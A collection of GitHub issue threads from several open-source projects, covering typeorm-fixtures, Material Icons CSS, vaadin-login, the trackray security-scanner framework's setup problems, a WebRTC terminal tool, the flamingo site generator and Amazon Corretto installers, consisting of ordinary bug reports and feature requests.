   "database":"blablabla",
   "ssl":false,
   "entityPrefix":"",
   "synchronize":true,
   "dropSchema":true,
   "logging":[ 
      "query",
      "error",
      "schema",
      "warn",
      "info",
      "log"
   ],
   "extra":{ 
      "ssl":false
   },
   "autoSchemaSync":true,
   "entities":[ 
      "./src/entities/*.*"
   ],
   "migrations":[ 
      "./src/migrations/*.*"
   ],
   "subscribers":[ 
      "./src/subscribers/*.*"
   ],
   "cli":{ 
      "entitiesDir":"./src/entities",
      "migrationsDir":"./src/migrations",
      "subscribersDir":"./src/subscribers"
   }
}`

Do you guys have any idea what could be wrong? For me, this seems the fixture is trying to run before have a opened connection. But make no sense because all logic is inside the then of `createConnection` 
 I have some entities being inserted via triggers in DB, and having a unique index (independent of the PK). Using fixtures, it's not possible to know what the row id will be in before, but I would like to use it later on to append relations on those entities.

So far I have tried creating a load processor to read the id and perform the update there, using the unique index columns. The update is done, but, I get a weird error afterwards:
```
Fail fixture loading: Could not find any entity of type "ProjectMap" matching: {
    "where": {}
}
```

My `preProcess` function:

```typescript
  async preProcess(name: string, obj: ProjectMap): Promise<ProjectMap> {
    const repository = getConnection().getRepository(ProjectMap);
    const { id } = await repository.findOneOrFail({ select: ['id'], where: { method: obj.method, resourceId: obj.resource.id } });
    obj.id = id;

    await repository.save(obj);

    return derived;
  }
```

I cannot find how the save fails afterwards, however perhaps I could skip the library's save by returning null? I was wondering if it's possible to use the current iteration as a string value in a field instead of just referencing relations. Like this:

````
entity: User
items:
  user{1..10}:
    firstName: '{{name.firstName}}'
    lastName: '{{name.lastName}}'
    email: 'email{{current}}@gmail.com'
````

This way all the fixtures will have email1@gmail.com -> email10@gmail.com How can I reference the `title` of the current iteration to slugify it with faker.helpers.slugify.  I would expect something like so

```
entity: Post
items:
  post{1..10}:
    title: '{{lorem.words}}'
    slug: '{{helpers.slugify(@title)}}'
    body: '{{lorem.paragraphs}}'
``` During installation of typeorm-fixtures-cli following warning is generated:

`warning typeorm-fixtures-cli > joi@14.3.1: This module has moved and is now available at @hapi/joi. Please update your dependencies as this version is no longer maintained an may contain bugs and security issues.
`
 ```npx fixtures ./fixtures --config ormconfig.js --connection Diligence```

```UnhandledPromiseRejectionWarning: ConnectionNotFoundError: Connection "default" was not found.```

```npx fixtures ./fixtures --config ormconfig.js -cn Diligence```

```
TypeOrm config /Users/samcong/code/repo/n not found
```

Config

module.exports = [
  {
    name: "Diligence",
    type: "mssql",
    host: "localhost",
    port: 11433,
    database: "Diligence",
    username: "sa",
    password: "password",
    entities: ["src/models/**/*.ts"]
  }
]; 
## The devDependency [@types/chai-as-promised](https://github.com/DefinitelyTyped/DefinitelyTyped) was updated from `7.1.1` to `7.1.2`.

🚨 [View failing branch](https://github.com/RobinCK/typeorm-fixtures/compare/master...RobinCK:greenkeeper%2F%40types%2Fchai-as-promised-7.1.2).

This version is **covered** by your **current version range** and after updating it in your project **the build failed**.




@types/chai-as-promised is a devDependency of this project. It **might not break your production code or affect downstream projects**, but probably breaks your build or test tools, which may **prevent deploying or publishing**.



<details>
<summary>Status Details</summary>

- ❌ **ci/circleci: build:** Your tests failed on CircleCI ([Details](https://circleci.com/gh/RobinCK/typeorm-fixtures/290?utm_campaign=vcs-integration-link&utm_medium=referral&utm_source=github-build-link)).
</details>


---




<details>
<summary>FAQ and help</summary>

There is a collection of [frequently asked questions](https://greenkeeper.io/faq.html). If those don’t help, you can always [ask the humans behind Greenkeeper](https://github.com/greenkeeperio/greenkeeper/issues/new).
</details>

---


Your [Greenkeeper](https://greenkeeper.io) Bot :palm_tree:
 ```npx fixtures ./fixtures --config ormconfig.js --connection Diligence```

```UnhandledPromiseRejectionWarning: ConnectionNotFoundError: Connection "default" was not found.```

```npx fixtures ./fixtures --config ormconfig.js -cn Diligence```

```
TypeOrm config /Users/samcong/code/repo/n not found
```

Config

module.exports = [
  {
    name: "Diligence",
    type: "mssql",
    host: "localhost",
    port: 11433,
    database: "Diligence",
    username: "sa",
    password: "password",
    entities: ["src/models/**/*.ts"]
  }
]; Is there a way to use as an API instead of CLI?
<---------->
155036990
@font-face {
  font-family: 'Material Icons';
  font-style: normal;
  font-weight: 400;
  src: url(https://fonts.gstatic.com/s/materialicons/v48/flUhRq6tzZclQEJ-Vdg-IuiaDsNZ.ttf) format('truetype');
}
@font-face {
  font-family: 'Material Icons Outlined';
  font-style: normal;
  font-weight: 400;
  src: url(https://fonts.gstatic.com/s/materialiconsoutlined/v13/gok-H7zzDkdnRel8-DQ6KAXJ69wP1tGnf4ZGhUcd.otf) format('opentype');
}
@font-face {
  font-family: 'Material Icons Round';
  font-style: normal;
  font-weight: 400;
  src: url(https://fonts.gstatic.com/s/materialiconsround/v13/LDItaoyNOAY6Uewc665JcIzCKsKc_M9flwmM.otf) format('opentype');
}
@font-face {
  font-family: 'Material Icons Sharp';
  font-style: normal;
  font-weight: 400;
  src: url(https://fonts.gstatic.com/s/materialiconssharp/v14/oPWQ_lt5nv4pWNJpghLP75WiFR4kLh3kvmvS.otf) format('opentype');
}
@font-face {
  font-family: 'Material Icons Two Tone';
  font-style: normal;
  font-weight: 400;
  src: url(https://fonts.gstatic.com/s/materialiconstwotone/v12/hESh6WRmNCxEqUmNyh3JDeGxjVVyMg4tHGctNCu3.otf) format('opentype');
}

.material-icons {
  font-family: 'Material Icons';
  font-weight: normal;
  font-style: normal;
  font-size: 24px;
  line-height: 1;
  letter-spacing: normal;
  text-transform: none;
  display: inline-block;
  white-space: nowrap;
  word-wrap: normal;
  direction: ltr;
}

.material-icons-outlined {
  font-family: 'Material Icons Outlined';
  font-weight: normal;
  font-style: normal;
  font-size: 24px;
  line-height: 1;
  letter-spacing: normal;
  text-transform: none;
  display: inline-block;
  white-space: nowrap;
  word-wrap: normal;
  direction: ltr;
}

.material-icons-round {
  font-family: 'Material Icons Round';
  font-weight: normal;
  font-style: normal;
  font-size: 24px;
  line-height: 1;
  letter-spacing: normal;
  text-transform: none;
  display: inline-block;
  white-space: nowrap;
  word-wrap: normal;
  direction: ltr;
}

.material-icons-sharp {
  font-family: 'Material Icons Sharp';
  font-weight: normal;
  font-style: normal;
  font-size: 24px;
  line-height: 1;
  letter-spacing: normal;
  text-transform: none;
  display: inline-block;
  white-space: nowrap;
  word-wrap: normal;
  direction: ltr;
}

.material-icons-two-tone {
  font-family: 'Material Icons Two Tone';
  font-weight: normal;
  font-style: normal;
  font-size: 24px;
  line-height: 1;
  letter-spacing: normal;
  text-transform: none;
  display: inline-block;
  white-space: nowrap;
  word-wrap: normal;
  direction: ltr;
} Google added new icons to the library, please update the font
<---------->
155199923
Expected: either there's no subscription validation since the license is Apache 2.0 (https://github.com/vaadin/vaadin-login/blob/master/LICENSE) or subscription validation dialog disappears after first successful validation

Actual:
![image](https://user-images.githubusercontent.com/2690773/50074435-937b1880-01e4-11e9-80c2-3eb170fa7377.png)

every time I open the page, no matter how many times I click on the pop-up
  Currently, the email/username field capitalizes the first letter (at least on iOS), and shows a red underline if I write a non-English word in it. The current [default string](https://github.com/vaadin/vaadin-login/blob/master/src/vaadin-login-mixin.html#L116) is useless for all users.

The slot at the end of the login form is just a place for some optional message, but in most cases it’s not needed. `<vaadin-login>` is a component that will provide an easy way to create a login page on which users can add to their applications and should be able to customize and theme.

Integration with authentication will be possible by defining an action for the form POST, if developer doesn't provide an action, a custom event will be triggered that developer can handle.

 Custom html content for footer doesn't work with `vaadin-login-overlay` Update README, document component's stylable parts Custom html content for footer doesn't work with `vaadin-login-overlay` Currently, the email/username field capitalizes the first letter (at least on iOS), and shows a red underline if I write a non-English word in it. What parts are exposed
Any other theming API?

* Expose styling part for setting a background image in the brand area (part="brand")
 Hi,
I am trying to learn the  JAVA framework. In the source code of vaadin bakery app, there is call to `setForgotPasswordButtonVisible(true);` in the constructor of LoginView.java. But no forgot password button is shown in the app.  Hi,
I am trying to learn the  JAVA framework. In the source code of vaadin bakery app, there is call to `setForgotPasswordButtonVisible(true);` in the constructor of LoginView.java. But no forgot password button is shown in the app.  I am new to vaadin JAVA framework. I am trying to understand the bakery app code. In `LoginView.java` there is a call to `setAction('login')`, which takes care of the login authorization. I want to add a new username and password. Can someone please shed a light how the app is successfully authorizing login credentials.   The current [default string](https://github.com/vaadin/vaadin-login/blob/master/src/vaadin-login-mixin.html#L116) is useless for all users.

The slot at the end of the login form is just a place for some optional message, but in most cases it’s not needed.  The username/password should be able to work with a password manager (eg. 1Password and LastPass)
 Hi

It could be interesting to have a new feature in this component (similar to the Forgot password  event) to route user to a SignUp page.

Thanks
 When user submits the login, the submit button is disabled to prevent another attempt before the login is processed.

Add:
- **Documentation** describing the behavior
- **Demo** with details with what the developer should do in order to re-enable login Similar to what is done with `title` and `description` properties for `vaadin-login-overlay` 
<---------->
155206197
不晓得为什么，我扫描http://testphp.vulnweb.com 只能扫描出xss
其他啥都扫描不出来，扫描选项我全开了，我不知道这个扫描是调用的awvs扫描还是sqlmap的扫描，或者其他扫描？
还是说扫描调用了awvs，然后有了sqli后，在进一步调用sqlmap 进行？？  https://github.com/chaitin/xray

其实有 grpc 的接口可以通信  1 ![image](https://user-images.githubusercontent.com/27730186/63324464-b7d25a80-c35a-11e9-9794-c2f07c99d00d.png)
有几个error。  2019-06-18 17:23:57.735  INFO 4171 --- [           main] com.trackray.WebApplication              : Started WebApplication in 10.42 seconds (JVM running for 11.142)
2019-06-18 17:23:58.960 ERROR 4171 --- [       Thread-4] com.trackray.base.utils.SysLog           : com.trackray.base.handle.SystemInit.check(87)metasploit 登录失败

我的 是kali 系统 运行了 startdep.sh  
但是我登录不了  1 您好 最近在使用该项目进行学习，插件总会遇到“插件未启用”的情况，比如敏感文件扫描，指纹扫描等等都会提示插件未启用。。。。   ![image](https://user-images.githubusercontent.com/27730186/63324464-b7d25a80-c35a-11e9-9794-c2f07c99d00d.png)
有几个error。 很多 POC 都按照 kunpeng 来写了，如果能加入那会很棒！！

库链接：https://github.com/opensec-cn/kunpeng

java引入方式：https://github.com/opensec-cn/kunpeng/blob/master/example/call_so_test.java

拜托考虑一下 不晓得为什么，我扫描http://testphp.vulnweb.com 只能扫描出xss
其他啥都扫描不出来，扫描选项我全开了，我不知道这个扫描是调用的awvs扫描还是sqlmap的扫描，或者其他扫描？
还是说扫描调用了awvs，然后有了sqli后，在进一步调用sqlmap 进行？？ 我第一次搭好的时候，测试是正常传入到awvs扫描了。今天再使用的时候，就不传入了，其他的都可以正常扫描，就只能awvs那里，一点反应都么有。
api key和ip我都确认是正确的。这是咋回事？ [INFO] trackray framework ................................. SUCCESS [  0.397 s]
[INFO] base ............................................... FAILURE [  9.057 s]
[INFO] module ............................................. SKIPPED
[INFO] web ................................................ SKIPPED
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  10.281 s
[INFO] Finished at: 2019-07-01T20:41:39+08:00
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.8.0:compile (default-compile) on project base: Compilation failure
[ERROR] No compiler is provided in this environment. Perhaps you are running on a JRE rather than a JDK?
[ERROR] 
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException
[ERROR] 
[ERROR] After correcting the problems, you can resume the build with the command
[ERROR]   mvn <goals> -rf :base
 首先感谢你的项目，今天我在虚拟机测试了一下，发现如下问题。
1、物理安装了awvs无法在虚拟机中访问。
2、msfconsole 默认pass user 都是msf,且连接失败。

建议公众开放一个QQ群或其他方便用户讨论。 trackray.jar
![image](https://user-images.githubusercontent.com/38883009/57963640-eb67a800-7959-11e9-9773-f5bdc698ceaf.png)
 下载太慢了，慢的我快疯了。 trackray.jar
![image](https://user-images.githubusercontent.com/38883009/57963640-eb67a800-7959-11e9-9773-f5bdc698ceaf.png)

<---------->
156137543
I only see these messages when typing as client:

`Failed to push SCTP packet: Failed handling chunk: Failure handling SACK: SACK Cumulative ACK 3408757062 is older than ACK point 3408757062` When pasting the answer from web, the process fail with the following message:

`Quitting with an unexpected error: "failed to parse IP address"`
 When pasting the answer from web, the process fail with the following message:

`Quitting with an unexpected error: "failed to parse IP address"`
 often (every 2nd or 3rd try) i get the error that the Onmessage-event-handler is not set after successfully established connection:
```
...
Terminal session started:
Onmessage has not been set for Datachannel data 0
                                                  Onmessage has not been set for Datachannel data 0
                                                                                                    Onmessage has not been set for Datachannel data 0
```
the connection is successful because for every keypress on the host-side i get one "Onmessage has not been set for Datachannel data 0" error-message on the client side.

dont know, but maybe cause some of the function you are using from webrtc are deprecated? e.g. Onmessage (https://github.com/pions/webrtc/blob/0043a4bf9adfdf01f8ece009432384a621b56f2c/rtcdatachannel.go#L96) or rtcPeerConnection *RTCPeerConnection (https://github.com/pions/webrtc/blob/0043a4bf9adfdf01f8ece009432384a621b56f2c/rtcdatachannel.go#L107) 🤷‍♂️ I only see these messages when typing as client:

`Failed to push SCTP packet: Failed handling chunk: Failure handling SACK: SACK Cumulative ACK 3408757062 is older than ACK point 3408757062`
<---------->
156219977
Example screenshot:
![screenshot](https://user-images.githubusercontent.com/934284/56261471-6c255100-60db-11e9-8605-502649d3b960.png)
IMO image descriptions should be constrained to the width of the image. Hi,
I am interested in the main differences between Flamingo and Pelican. Why did you start coding this and not just use pelican? What is the problem you want to solve that is not solved by pelican?

Maybe this is something other ppl are interested in. IMHO it would be nice to include it in the README because it might be a pro argument to use your software...

Thanks
Philip Hi,
I am interested in the main differences between Flamingo and Pelican. Why did you start coding this and not just use pelican? What is the problem you want to solve that is not solved by pelican?

Maybe this is something other ppl are interested in. IMHO it would be nice to include it in the README because it might be a pro argument to use your software...

Thanks
Philip Installing flamingo with pip2 or pip fails on import with this backtrace:

```
$ pip install flamingo
Collecting flamingo
  Using cached https://files.pythonhosted.org/packages/86/58/d53a3dc11916acd1b9ec17966b23bc4868da8a22aa6012600730c48a837d/flamingo-0.10.4.tar.gz
    Complete output from command python setup.py egg_info:
    Traceback (most recent call last):
      File "<string>", line 1, in <module>
      File "/run/user/rfigura/pip-install-3RYxRR/flamingo/setup.py", line 7, in <module>
        import flamingo
      File "flamingo/__init__.py", line 3, in <module>
        from flamingo.core.plugins.hooks import hook  # NOQA
      File "flamingo/core/plugins/__init__.py", line 4, in <module>
        from .media import Media  # NOQA
      File "flamingo/core/plugins/media.py", line 3, in <module>
        from flamingo.core.data_model import ContentSet, Content
      File "flamingo/core/data_model.py", line 4, in <module>
        from textwrap import shorten
    ImportError: cannot import name shorten
    
    ----------------------------------------
Command "python setup.py egg_info" failed with error code 1 in /
```

Under debian 10.0 you can install pip3 like this:

```
root# apt install python3-pip
``` Installing flamingo with pip2 or pip fails on import with this backtrace:

```
$ pip install flamingo
Collecting flamingo
  Using cached https://files.pythonhosted.org/packages/86/58/d53a3dc11916acd1b9ec17966b23bc4868da8a22aa6012600730c48a837d/flamingo-0.10.4.tar.gz
    Complete output from command python setup.py egg_info:
    Traceback (most recent call last):
      File "<string>", line 1, in <module>
      File "/run/user/rfigura/pip-install-3RYxRR/flamingo/setup.py", line 7, in <module>
        import flamingo
      File "flamingo/__init__.py", line 3, in <module>
        from flamingo.core.plugins.hooks import hook  # NOQA
      File "flamingo/core/plugins/__init__.py", line 4, in <module>
        from .media import Media  # NOQA
      File "flamingo/core/plugins/media.py", line 3, in <module>
        from flamingo.core.data_model import ContentSet, Content
      File "flamingo/core/data_model.py", line 4, in <module>
        from textwrap import shorten
    ImportError: cannot import name shorten
    
    ----------------------------------------
Command "python setup.py egg_info" failed with error code 1 in /
```

Under debian 10.0 you can install pip3 like this:

```
root# apt install python3-pip
``` Example screenshot:
![screenshot](https://user-images.githubusercontent.com/934284/56261407-2f595a00-60db-11e9-8250-b04fc1ff568b.png)
The enumerated list should be indented deeper than the surrounding text.
 In flamingo v0.11 the HTML parser (`flamingo/plugins/html.py`) has a tendency to alter the structure of HTML documents. 

In my current project with `HTML_PARSER_RAW_HTML = False` I can reproduce the behavior with this HTML document. (`[...]` means that there is some content left out.)

```
template: raw.html


    <div class="main">
        <div>
            <a href="/">Zurück zur Hauptseite</a><br><br>
[...]
        <h4>Cookies</h4>
        <p>Diese Webseite verwendet keine Cookies oder ähnliche Technologien.</p>

        </div>
        <h2 id="footnote">Eine Veranstaltung des <a href="https://stratum0.org">Stratum 0</a></h2>
        <a style="display:none;" rel="me" href="https://chaos.social/@HackenOpenAir">Mastodon</a>
    </div>
```

This generates the following output:

```
 <div class="main">
<div>
<a href="/">Zurück zur Hauptseite</a><br><br>
[...]
<h4>Externe Inhalte</h4>
<p>Zur Darstellung der Webseite werden Inhalte von www.openstreetmap.org nachgeladen.</p>
<h4>Cookies</h4>
<p>Diese Webseite verwendet keine Cookies oder ähnliche Technologien.</p>
</p></br></br></br></br></br></br></div>
<h2 id="footnote">Eine Veranstaltung des <a href="https://stratum0.org">Stratum 0</a></h2>
<a href="https://chaos.social/@HackenOpenAir" rel="me" style="display:none;">Mastodon</a>
</div>
```

The main problem here are the extra `</p></br></br></br></br></br></br>` that are inserted by the HTML-parser.

I understand that Beautiful Soup is used to alter the src-attributes of images when using the media-API. But in most use-cases an altered HTML-structure as a whole is not acceptable.

When setting `HTML_PARSER_RAW_HTML = True` this behavior disappears. Example screenshot:
![screenshot](https://user-images.githubusercontent.com/934284/56261407-2f595a00-60db-11e9-8250-b04fc1ff568b.png)
The enumerated list should be indented deeper than the surrounding text.
 Example screenshot:
![screenshot](https://user-images.githubusercontent.com/934284/56261471-6c255100-60db-11e9-8605-502649d3b960.png)
IMO image descriptions should be constrained to the width of the image.
<---------->
156599958
### Describe the bug
I uninstalled both Corretto x86/x64 in Windows;
But the JAVA_HOME and PATH environment variable remains, and the installed directory remains empty.

### To Reproduce
1. Install both Corretto x86/x64 in Windows (with default option)
2. Uninstall both Corretto x86/x64.

### Expected behavior
Both JAVA_HOME and PATH (x86/x64) environment will be removed after uninstall.

### Screenshots
![after-uninstall-java_home path folder](https://user-images.githubusercontent.com/3313661/51072422-d1fcd980-16a3-11e9-999f-066131f60c67.png)

It depends on install/uninstall order.

### Platform information
    OS: Windows 10
    Version "build 1.8.0_192-amazon-corretto-preview2-b12"

### Additional context
This issue is related to #15, #22 and #37 .
 


### Describe the bug
When executing third party calls like gcp and twitter through java sdk mostly seen certificates not found

### To Reproduce
Just run gcp example from https://github.com/googleapis/google-cloud-java/tree/master/google-cloud-examples

### Expected behavior
Should run without the certificate error



### Platform information
    openjdk version "1.8.0_232"
OpenJDK Runtime Environment Corretto-8.232.09.1 (build 1.8.0_232-b09)
OpenJDK 64-Bit Server VM Corretto-8.232.09.1 (build 25.232-b09, mixed mode)

### Additional context
`

Exception in thread "main" com.google.cloud.bigquery.BigQueryException: Error getting access token for service account: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target
        at com.google.cloud.bigquery.spi.v2.HttpBigQueryRpc.translate(HttpBigQueryRpc.java:106)
        at com.google.cloud.bigquery.spi.v2.HttpBigQueryRpc.create(HttpBigQueryRpc.java:206)
        at com.google.cloud.bigquery.BigQueryImpl$5.call(BigQueryImpl.java:319)
        at com.google.cloud.bigquery.BigQueryImpl$5.call(BigQueryImpl.java:316)
        at com.google.api.gax.retrying.DirectRetryingExecutor.submit(DirectRetryingExecutor.java:105)
        at com.google.cloud.RetryHelper.run(RetryHelper.java:76)
        at com.google.cloud.RetryHelper.runWithRetries(RetryHelper.java:50)
        at com.google.cloud.bigquery.BigQueryImpl.create(BigQueryImpl.java:315)
        at com.google.cloud.bigquery.BigQueryImpl.create(BigQueryImpl.java:290)
        at com.google.cloud.examples.bigquery.BigQueryExample$JobRunAction.run(BigQueryExample.java:521)
        at com.google.cloud.examples.bigquery.BigQueryExample$JobRunAction.run(BigQueryExample.java:517)
        at com.google.cloud.examples.bigquery.BigQueryExample.main(BigQueryExample.java:774)
Caused by: java.io.IOException: Error getting access token for service account: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target
        at com.google.auth.oauth2.ServiceAccountCredentials.refreshAccessToken(ServiceAccountCredentials.java:432)
        at com.google.auth.oauth2.OAuth2Credentials.refresh(OAuth2Credentials.java:157)
        at com.google.auth.oauth2.OAuth2Credentials.getRequestMetadata(OAuth2Credentials.java:145)
        at com.google.auth.http.HttpCredentialsAdapter.initialize(HttpCredentialsAdapter.java:91)
        at com.google.cloud.http.HttpTransportOptions$1.initialize(HttpTransportOptions.java:159)
        at com.google.api.client.http.HttpRequestFactory.buildRequest(HttpRequestFactory.java:88)
        at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.buildHttpRequest(AbstractGoogleClientRequest.java:422)
        at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:541)
        at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:474)
        at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:591)
        at com.google.cloud.bigquery.spi.v2.HttpBigQueryRpc.create(HttpBigQueryRpc.java:204)
        ... 10 more
Caused by: javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target
        at sun.security.ssl.Alerts.getSSLException(Alerts.java:192)
        at sun.security.ssl.SSLSocketImpl.fatal(SSLSocketImpl.java:1946)
        at sun.security.ssl.Handshaker.fatalSE(Handshaker.java:316)
        at sun.security.ssl.Handshaker.fatalSE(Handshaker.java:310)
        at sun.security.ssl.ClientHandshaker.serverCertificate(ClientHandshaker.java:1639)
        at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:223)
        at sun.security.ssl.Handshaker.processLoop(Handshaker.java:1037)
        at sun.security.ssl.Handshaker.process_record(Handshaker.java:965)
        at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1064)
        at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1367)
        at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1395)
        at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1379)
        at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559)
        at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185)
        at sun.net.www.protocol.http.HttpURLConnection.getOutputStream0(HttpURLConnection.java:1340)
        at sun.net.www.protocol.http.HttpURLConnection.getOutputStream(HttpURLConnection.java:1315)
        at sun.net.www.protocol.https.HttpsURLConnectionImpl.getOutputStream(HttpsURLConnectionImpl.java:264)
        at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:108)
        at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:79)
        at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:996)
        at com.google.auth.oauth2.ServiceAccountCredentials.refreshAccessToken(ServiceAccountCredentials.java:429)
        ... 20 more
Caused by: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target
        at sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:397)
        at sun.security.validator.PKIXValidator.engineValidate(PKIXValidator.java:302)
        at sun.security.validator.Validator.validate(Validator.java:262)
        at sun.security.ssl.X509TrustManagerImpl.validate(X509TrustManagerImpl.java:330)
        at sun.security.ssl.X509TrustManagerImpl.checkTrusted(X509TrustManagerImpl.java:237)
        at sun.security.ssl.X509TrustManagerImpl.checkServerTrusted(X509TrustManagerImpl.java:132)
        at sun.security.ssl.ClientHandshaker.serverCertificate(ClientHandshaker.java:1621)
        ... 36 more
Caused by: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target
        at sun.security.provider.certpath.SunCertPathBuilder.build(SunCertPathBuilder.java:141)
        at sun.security.provider.certpath.SunCertPathBuilder.engineBuild(SunCertPathBuilder.java:126)
        at java.security.cert.CertPathBuilder.build(CertPathBuilder.java:280)
        at sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:392)
        ... 42 more

`
 Thank you for taking the time to help improve OpenJDK and Corretto.

If your request concerns a security vulnerability then please report it by email to aws-security@amazon.com instead of here.
(You can find more information regarding security issues at https://aws.amazon.com/security/vulnerability-reporting/.)

Otherwise, if your issue concerns OpenJDK 8
and is not specific to Corretto 8
we ask that you raise it to the OpenJDK community.
Depending on your contributor status for OpenJDK,
please use the [JDK bug system]() or
the appropriate [mailing list](http://mail.openjdk.java.net/mailman/listinfo)
for the given problem area or update project [jdk8u-dev](http://mail.openjdk.java.net/mailman/listinfo/jdk8u-dev).

If your issue is specific to Corretto 8,
then you are in the right place.
Please proceed with the following.

### Describe the bug
A clear and concise description of what the bug is.

### To Reproduce
Steps and (source) code to reproduce the behavior.

### Expected behavior
A clear and concise description of what you expected to happen.

### Screenshots
If applicable, add screenshots to help explain your problem.

### Platform information
    OS: [e.g. Amazon Linux 2]
    Version [e.g. "build 1.8.0_192-amazon-corretto-preview-b12" (output from "java -version")]

### Additional context
Add any other context about the problem here.
 ### Describe the bug
When installing the JDK MSI (amazon-corretto-8.212.04.2-windows-x64.msi), the registry keys are created (HKEY_LOCAL_MACHINE\SOFTWARE\JavaSoft\Java Runtime Environment).  However, the sub-key below this root that is being made containing the version number is not in the correct format.  The sub-key is "1.8.0.212" when the Oracle Java method is "1.8.0_212".  This is causing some application to be unable to determine if the JRE is installed and fails to run.  Renaming the key to use the underscore instead of the period allows the applications to function properly.

### To Reproduce
Install JDK MSI and look at the registry key name.  Modify the registry key name to resolve.

### Expected behavior
Applications using Java Runtime Environment should launch properly if they are using the registry keys to check for version of Java installed.

### Screenshots
Invalid registry key format:
![image](https://user-images.githubusercontent.com/50115760/56915103-515bc080-6a7b-11e9-917e-1d16841cf23f.png)

Correct registry key format:
![image](https://user-images.githubusercontent.com/50115760/56915205-89fb9a00-6a7b-11e9-81cc-66a0381a09f0.png)

### Platform information
    OS: Windows 10 x64
    Version: amazon-corretto-8.212.04.2-windows-x64.msi

### Additional context
This is just going to impact poorly written applications, but is causing issues nonetheless.
 When using the Windows MSI installer (amazon-corretto-8.202.08.2-windows-x64.msi), the [UAC popup Window](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is unbranded and doesn't tell me what I'm approving. It just says: "a9aec.msi".

![image](https://user-images.githubusercontent.com/575626/56168986-9c60d880-5f91-11e9-9ee5-dcadea24b57c.png)
 I was expecting that installation of 8.212 would remove 8.202. 

Upgrade code is the same, so it should, but 8.202 remains. ### Is your feature request related to a problem?
Yes. I want to publish Mac app with embedded JRE. But, to publish, I need to notarize app. Notarization needs executable files to be built with SDK 10.9 or plus. But, as corretto is built with Xcode 4, it is built with SDK 10.8.

### Describe a solution you would like
Built with xcode 9+. 

### Describe alternatives you have considered
My alternative is to build OpenJDK myself. But, that would be very tough job.

### Additional info
You can visit this repo: https://github.com/stooke/jdk8u-xcode10 

### Describe the bug
When executing third party calls like gcp and twitter through java sdk mostly seen certificates not found

### To Reproduce
Just run gcp example from https://github.com/googleapis/google-cloud-java/tree/master/google-cloud-examples

### Expected behavior
Should run without the certificate error



### Platform information
    openjdk version "1.8.0_232"
OpenJDK Runtime Environment Corretto-8.232.09.1 (build 1.8.0_232-b09)
OpenJDK 64-Bit Server VM Corretto-8.232.09.1 (build 25.232-b09, mixed mode)

### Additional context
`

Exception in thread "main" com.google.cloud.bigquery.BigQueryException: Error getting access token for service account: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target
        at com.google.cloud.bigquery.spi.v2.HttpBigQueryRpc.translate(HttpBigQueryRpc.java:106)
        at com.google.cloud.bigquery.spi.v2.HttpBigQueryRpc.create(HttpBigQueryRpc.java:206)
        at com.google.cloud.bigquery.BigQueryImpl$5.call(BigQueryImpl.java:319)
        at com.google.cloud.bigquery.BigQueryImpl$5.call(BigQueryImpl.java:316)
        at com.google.api.gax.retrying.DirectRetryingExecutor.submit(DirectRetryingExecutor.java:105)
        at com.google.cloud.RetryHelper.run(RetryHelper.java:76)
        at com.google.cloud.RetryHelper.runWithRetries(RetryHelper.java:50)
        at com.google.cloud.bigquery.BigQueryImpl.create(BigQueryImpl.java:315)
        at com.google.cloud.bigquery.BigQueryImpl.create(BigQueryImpl.java:290)
        at com.google.cloud.examples.bigquery.BigQueryExample$JobRunAction.run(BigQueryExample.java:521)
        at com.google.cloud.examples.bigquery.BigQueryExample$JobRunAction.run(BigQueryExample.java:517)
        at com.google.cloud.examples.bigquery.BigQueryExample.main(BigQueryExample.java:774)
Caused by: java.io.IOException: Error getting access token for service account: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target
        at com.google.auth.oauth2.ServiceAccountCredentials.refreshAccessToken(ServiceAccountCredentials.java:432)
        at com.google.auth.oauth2.OAuth2Credentials.refresh(OAuth2Credentials.java:157)
        at com.google.auth.oauth2.OAuth2Credentials.getRequestMetadata(OAuth2Credentials.java:145)
        at com.google.auth.http.HttpCredentialsAdapter.initialize(HttpCredentialsAdapter.java:91)
        at com.google.cloud.http.HttpTransportOptions$1.initialize(HttpTransportOptions.java:159)
        at com.google.api.client.http.HttpRequestFactory.buildRequest(HttpRequestFactory.java:88)
